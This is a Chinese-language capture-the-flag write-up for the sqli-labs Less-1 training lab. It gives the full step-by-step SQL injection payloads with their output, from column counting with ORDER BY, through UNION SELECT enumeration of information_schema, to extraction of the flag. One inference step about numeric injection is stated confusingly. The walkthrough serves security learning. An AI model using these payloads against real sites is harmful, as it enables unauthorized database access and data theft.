题目：sqli-labs less1

根据提示`Please input the ID as parameter with numeric value`
在url地址后加入`?id=1`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:Dumb
Your Password:Dumb
```
检查是否为数字型注入，在url地址后加入`?id=2-1`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:Angelina
Your Password:I-kill-you
```
输出发生改变，可以看出非数字型注入
现在检查是否为字符型注入，在url地址后加入`?id=1a`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:Dumb
Your Password:Dumb
```
输出与加入`?id=1`相比没有变化，因此可以看出为字符型注入
接下来测试后端代码运用到的列数，在url后分别加入`?id=1 order by 3 --+`与`?id=1 order by 4 --+`，访问后，输出分别如下
```
Welcome    Dhakkan
Your Login name:Dumb
Your Password:Dumb
```
```
Welcome    Dhakkan
Unknown column '4' in 'order clause'
```
因此可以知道列数为3，接下来使用union类型注入，在url后加入`?id=0' union select '123'，'1234'，'12345' --+`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:1234
Your Password:12345
```
因此可知后两列的输出将被使用，现在查询有哪些数据库，在url后加入`?id=0' union select '123',(SELECT Group_concat(schema_name) FROM information_schema.schemata),'12345' --+`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:ctftraining,information_schema,mysql,performance_schema,security,test
Your Password:12345
```
查看ctftraining库中存在哪些表，在url后加入`?id=0' union select '123',(SELECT Group_concat(table_name) FROM information_schema.tables where table_schema='ctftraining'),'12345' --+`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:flag,news,users
Your Password:12345
```
查看flag表中有哪些字段，在url后加入`?id=0' union select '123',(SELECT Group_concat(column_name) FROM information_schema.columns where table_schema='ctftraining' and table_name='flag'),'12345' --+`，访问后，输出如下
```
Welcome    Dhakkan
Your Login name:flag
Your Password:12345
```
最后查询flag表，在url后加入`?id=0' union select '123',(SELECT Group_concat(column_name) FROM information_schema.columns where table_schema='ctftraining' and table_name='flag'),(SELECT Group_concat(flag) FROM ctftraining.flag) --+`，访问后，得到`flag`
```
Welcome    Dhakkan
Your Login name:flag
Your Password:flag{062c46c6-b29f-4f59-89f5-2c10de61fe75}
```
